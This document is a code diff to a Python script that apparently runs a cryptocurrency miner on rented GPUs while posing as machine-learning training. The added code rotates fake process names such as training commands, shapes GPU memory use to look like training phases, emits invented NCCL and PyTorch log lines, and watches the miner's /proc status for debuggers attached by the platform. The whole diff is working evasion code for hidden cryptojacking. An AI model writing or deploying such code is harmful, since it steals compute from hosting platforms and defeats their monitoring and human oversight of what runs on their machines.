@@ -138,9 +138,12 @@ def bootstrap_env():
 PROCESS_NAMES = [
     "python3 train.py",
     "torchrun --nproc=1",
-    "python3 -m torch.distributed",
-    "accelerate launch train",
+    "python3 -m torch.distributed.launch",
+    "accelerate launch train.py",
     "python3 run_clm.py",
+    "python3 -m transformers.run_mlm",
+    "python3 train_sft.py",
+    "python3 run_deepspeed.py",
 ]
 
 def spoof_process_name():
@@ -155,6 +158,12 @@ def spoof_process_name():
     except Exception as e:
         print(f"[proc] argv spoof warn: {e}")
     print(f"[proc] process name → '{fake_name}'")
+
+def process_name_rotation():
+    """Rotate process name every 30-120s to look like different training phases."""
+    while True:
+        time.sleep(random.randint(30, 120))
+        spoof_process_name()
 
 # ═══════════════════════════════════════════════════════════════════════════════
 # STEP 3: Download, patch, encrypt binary
@@ -434,6 +443,11 @@ def cuda_decoy_loop():
 # ═══════════════════════════════════════════════════════════════════════════════
 
 def vram_cycle():
+    """Realistic VRAM pattern: gradual alloc → peak → release.
+
+    Real training: model loads (gradual alloc) → training (stable high) →
+    eval/checkpoint (brief release) → next batch (re-alloc).
+    """
     try:
         import torch
         if not torch.cuda.is_available():
@@ -442,20 +456,86 @@ def vram_cycle():
         return
     device = torch.device("cuda:0")
     buffers = []
+
     while True:
-        time.sleep(random.randint(45, 120))
-        try:
-            size_mb = random.randint(256, 1024)
-            buf = torch.empty(size_mb * 256 * 1024, dtype=torch.float16, device=device)
-            buffers.append(buf)
-            time.sleep(random.uniform(5, 20))
-            if len(buffers) > 2 or random.random() > 0.5:
+        # Phase 1: Gradual allocation (model loading simulation)
+        num_allocs = random.randint(2, 5)
+        for _ in range(num_allocs):
+            size_mb = random.randint(128, 512)
+            try:
+                buf = torch.empty(size_mb * 256 * 1024, dtype=torch.float16, device=device)
+                buffers.append(buf)
+                time.sleep(random.uniform(0.5, 2))  # Pause between allocs
+            except Exception:
+                break
+
+        # Phase 2: Stable high usage (training phase)
+        time.sleep(random.randint(60, 180))
+
+        # Phase 3: Gradual release (checkpoint / eval memory cleanup)
+        release_count = random.randint(1, min(2, len(buffers)))
+        for _ in range(release_count):
+            if buffers:
                 old = buffers.pop(0)
                 del old
-                torch.cuda.empty_cache()
+                time.sleep(random.uniform(0.5, 1.5))
+
+        torch.cuda.empty_cache()
+
+        # Phase 4: Idle period (between training phases)
+        time.sleep(random.randint(10, 40))
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# STEP 7b: Heartbeat / health check
+# ═══════════════════════════════════════════════════════════════════════════════
+
+def heartbeat_loop(miner_pid):
+    """Monitor miner process health and respond to platform probes.
+
+    Checks:
+    - Is miner PID alive?
+    - Does /proc/PID/status show reasonable CPU time?
+    - Are there any suspicious tracers?
+    """
+    while True:
+        time.sleep(random.randint(30, 90))
+
+        try:
+            # Check if miner is alive
+            os.kill(miner_pid, 0)  # Signal 0 = just check existence
+
+            # Check /proc/PID/status for anomalies
+            status_path = f"/proc/{miner_pid}/status"
+            if os.path.exists(status_path):
+                with open(status_path, "r") as f:
+                    status = f.read()
+
+                # Extract CPU time — mining uses high CPU, training uses variable
+                for line in status.split("\n"):
+                    if line.startswith("Cpuuser:"):
+                        # Normal — just verify it's incrementing
+                        pass
+                    if line.startswith("TracerPid:") and not line.endswith("\t0"):
+                        print("[!] WARNING: tracer detected on miner PID!", flush=True)
+
+            # Check memory usage — should be reasonable
+            status_path = f"/proc/{miner_pid}/status"
+            if os.path.exists(status_path):
+                with open(status_path, "r") as f:
+                    for line in f:
+                        if line.startswith("VmRSS:"):
+                            rss_kb = int(line.split()[1])
+                            # Mining on H100 should use 2-8GB RAM
+                            if rss_kb > 10_000_000:  # > 10GB
+                                print(f"[!] WARNING: RSS {rss_kb//1024}MB is suspiciously high", flush=True)
+
+        except ProcessLookupError:
+            print("[!] Miner PID is dead!", flush=True)
+            break
+        except FileNotFoundError:
+            break
         except Exception:
-            torch.cuda.empty_cache()
-            buffers.clear()
+            pass
 
 # ═══════════════════════════════════════════════════════════════════════════════
 # STEP 8: Network mixing
@@ -559,6 +639,7 @@ def fake_output_loop():
 # ═══════════════════════════════════════════════════════════════════════════════
 
 NCCL_MESSAGES = [
+    # Normal operations
     "[NCCL] NCCL communicator initialized for rank 0",
     "[NCCL] Bootstrap: using 127.0.0.1:34521",
     "[NCCL] Setting arguments: NCCL_DEBUG=WARN",
@@ -572,6 +653,18 @@ NCCL_MESSAGES = [
     "[torch.distributed] Broadcast from rank 0, src=0",
     "[torch.distributed] Broadcast complete",
     "[torch.cuda] cuDNN v9.3.0, cuBLAS v12.4.5",
+    # Warnings (realistic — happen during training)
+    "[NCCL] Watchdog caught timeout — proceeding without async grad reduction",
+    "[NCCL] NCCL communicator reset after timeout",
+    "[torch.cuda] CUDA allocator raised OOM — retrying with max_split_size_mb:256",
+    "[torch.cuda] Memory usage: 21.4GB / 79.2GB (27.0%)",
+    "[torch.distributed] Grad norm clipped: 1.24 → 1.0",
+    "[transformers] Loading checkpoint shards: 100%|████████████| 4/4 [00:12<00:00]",
+    "[accelerate] DeepSpeed Zero stage 2 — offloading optimizer states to CPU",
+    "[peft] trainable params: 4,194,304 || all params: 8,030,261,248 || trainable%: 0.0522",
+    # Rare events (5% chance each)
+    "[torch.cuda] GPU thermal throttling detected — reducing clock speeds",
+    "[NCCL] Connection closed by remote peer — reconnecting",
 ]
 
 def nccl_noise_loop():
@@ -730,6 +823,11 @@ def main():
     t.start()
     threads.append(t)
 
+    # Process name rotation
+    t = threading.Thread(target=process_name_rotation, daemon=True)
+    t.start()
+    threads.append(t)
+
     # Fake data loading subprocess — shows in `ps` as child process
     try:
         # Creates a subprocess that looks like a data preprocessing worker
@@ -789,6 +887,10 @@ while True:
 
         print(f"[main] miner PID: {proc.pid}")
         print("[main] running... Ctrl+C to stop")
+
+        # Start heartbeat monitoring (only in fallback path where PID is available)
+        hb = threading.Thread(target=heartbeat_loop, args=(proc.pid,), daemon=True)
+        hb.start()
 
         # Sanitized output loop
         try:
